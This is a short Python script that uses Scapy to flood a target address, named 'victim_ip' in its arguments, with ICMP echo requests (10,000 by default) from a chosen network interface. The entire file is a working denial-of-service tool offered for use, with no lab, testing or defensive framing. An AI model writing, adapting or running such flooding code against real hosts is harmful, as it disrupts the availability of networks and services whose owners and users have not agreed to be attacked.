from scapy.all import IP, ICMP, send, conf
import argparse, time

ap = argparse.ArgumentParser()
ap.add_argument("victim_ip")
ap.add_argument("-c", "--count", type=int, default=10_000)
ap.add_argument("-i", "--iface", default=None,
                help="TX interface (defaults to Scapy's conf.iface)")
args = ap.parse_args()

if args.iface:
    conf.iface = args.iface

pkt = IP(dst=args.victim_ip)/ICMP()
print(f"[*] Sending {args.count} echo requests on {conf.iface}")
for _ in range(args.count):
    send(pkt, verbose=False)